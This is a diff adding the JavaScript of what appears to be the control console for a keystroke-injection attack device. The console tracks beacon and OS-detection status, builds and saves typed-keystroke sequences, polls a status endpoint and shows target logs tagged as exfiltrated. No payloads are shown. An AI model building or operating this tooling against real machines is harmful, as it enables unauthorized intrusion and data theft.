+    var status = document.getElementById('beacon-status');
+    if(os && os!=='Detecting...'){
+      osEl.textContent   = os;
+      osEl.className     = 'v '+(conf>=5?'green':conf>=3?'amber':'red');
+      confEl.textContent = conf+'/8';
+      fill.style.width      = Math.round(conf/8*100)+'%';
+      fill.style.background = conf>=5?'var(--green)':conf>=3?'var(--amber)':'var(--red)';
+      dot.className      = 'beacon-dot';
+      status.textContent = 'ACTIVE';
+    } else {
+      osEl.textContent   = 'DETECTING...';
+      osEl.className     = 'v amber';
+      confEl.textContent = '—';
+      fill.style.width   = '0%';
+      dot.className      = 'beacon-dot offline';
+      status.textContent = 'ENUMERATING';
+    }
+  }
+
+  // ── Custom commands (localStorage) ──
+  var customCmds = JSON.parse(localStorage.getItem('c3p_cmds')||'[]');
+  function saveCustomCmds(){ localStorage.setItem('c3p_cmds',JSON.stringify(customCmds)); }
+
+  function deleteCustomCmd(id){
+    customCmds = customCmds.filter(function(c){ return c.id!==id; });
+    saveCustomCmds(); renderCustomList();
+  }
+
+  function renderCustomList(){
+    var list = document.getElementById('custom-list');
+    list.innerHTML = '';
+    if(!customCmds.length){ list.innerHTML='<span class="no-items">No saved commands.</span>'; return; }
+    customCmds.forEach(function(cmd){
+      var row = document.createElement('div');
+      row.className = 'custom-row';
+      var btn = document.createElement('button');
+      btn.className   = 'module-btn';
+      btn.textContent = (cmd.os!=='ANY'?'['+cmd.os+'] ':'')+cmd.name;
+      (function(steps){ btn.addEventListener('click',function(){ runSteps(steps); }); })(cmd.steps);
+      var del = document.createElement('button');
+      del.className   = 'del-btn';
+      del.textContent = '✕';
+      (function(id){ del.addEventListener('click',function(){ deleteCustomCmd(id); }); })(cmd.id);
+      row.appendChild(btn); row.appendChild(del); list.appendChild(row);
+    });
+  }
+
+  // ── Command builder ──
+  var builderSteps = [];
+
+  function updateStepInput(){
+    var t = document.getElementById('step-type').value;
+    document.getElementById('step-text-in').style.display = t==='TYPE'  ? '' : 'none';
+    document.getElementById('step-key-in').style.display  = t==='PRESS' ? '' : 'none';
+    document.getElementById('step-ms-in').style.display   = t==='WAIT'  ? '' : 'none';
+  }
+
+  function addBuilderStep(){
+    var t = document.getElementById('step-type').value;
+    var step;
+    if(t==='TYPE'){
+      var v = document.getElementById('step-text-in').value;
+      if(!v) return;
+      step = {t:'TYPE', v:v};
+      document.getElementById('step-text-in').value = '';
+    } else if(t==='PRESS'){
+      step = {t:'PRESS', k:document.getElementById('step-key-in').value};
+    } else {
+      step = {t:'WAIT', ms:parseInt(document.getElementById('step-ms-in').value)||500};
+    }
+    builderSteps.push(step);
+    renderBuilderSteps();
+  }
+
+  function removeBuilderStep(i){ builderSteps.splice(i,1); renderBuilderSteps(); }
+
+  function renderBuilderSteps(){
+    var list = document.getElementById('builder-steps');
+    if(!builderSteps.length){
+      list.innerHTML = '<div id="steps-empty">No steps — add one below</div>';
+      return;
+    }
+    list.innerHTML = '';
+    builderSteps.forEach(function(s,i){
+      var item = document.createElement('div');
+      item.className = 'step-item';
+      var tag = s.t, val = s.t==='TYPE' ? '"'+s.v+'"' : s.t==='PRESS' ? s.k : s.ms+'ms';
+      item.innerHTML = '<span class="step-num">'+(i+1)+'.</span>'
+                     + '<span class="step-tag">'+tag+'</span>'
+                     + '<span class="step-val">'+escHtml(val)+'</span>';
+      var del = document.createElement('button');
+      del.className='step-del'; del.textContent='✕';
+      (function(idx){ del.addEventListener('click',function(){ removeBuilderStep(idx); }); })(i);
+      item.appendChild(del); list.appendChild(item);
+    });
+  }
+
+  function runBuilder(){
+    if(!builderSteps.length) return;
+    runSteps(builderSteps.slice());
+  }
+
+  function saveBuilderCmd(){
+    var name = document.getElementById('builder-name').value.trim();
+    if(!name || !builderSteps.length) return;
+    var os = document.getElementById('builder-os').value;
+    customCmds.push({id:uid(), name:name, os:os, steps:builderSteps.slice()});
+    saveCustomCmds(); renderCustomList();
+    builderSteps = [];
+    document.getElementById('builder-name').value = '';
+    renderBuilderSteps();
+    appendLog('SAVED: '+name,'log-sys');
+  }
+
+  document.getElementById('step-text-in').addEventListener('keydown',function(e){
+    if(e.key==='Enter') addBuilderStep();
+  });
+
+  // ── Sync loop ──
+  function syncConsole(){
+    fetch('/status').then(function(r){ return r.json(); }).then(function(data){
+      var os   = (data.os||'').trim();
+      var conf = parseInt(data.confidence)||0;
+      var logs = data.logs||'';
+      var changed = (os!==detectedOS || conf!==detectedConf);
+      detectedOS = os; detectedConf = conf;
+      if(!overrideOS){ renderStatus(os,conf); if(changed) renderModules(); }
+      if(logs && logs!==lastLogs){
+        var fresh = logs.replace(lastLogs,'').trim();
+        if(fresh) appendLog(fresh,'log-exfil');
+        lastLogs = logs;
+      }
+      if(data.nat==='1' && document.getElementById('nat-val').textContent!=='ACTIVE'){
+        document.getElementById('nat-val').textContent = 'ACTIVE';
+        document.getElementById('nat-val').className = 'v green';
+      }
+    }).catch(function(){
+      document.getElementById('beacon-dot').className    = 'beacon-dot offline';
+      document.getElementById('beacon-status').textContent = 'OFFLINE';
+    });
+    setTimeout(syncConsole, 1000);
+  }
+
+  // Init
+  updateStepInput();
+  renderCustomList();
+  if(hookUrl){
+    document.getElementById('hook-url').value = hookUrl;
+    document.getElementById('hook-status').textContent = '✓ ' + hookUrl.replace(/^https?:\/\//,'').slice(0,34);
+    document.getElementById('hook-status').className = 'ok';
+  }
+  syncConsole();
+  loadARStatus();
+</script>
+</body>
+</html>
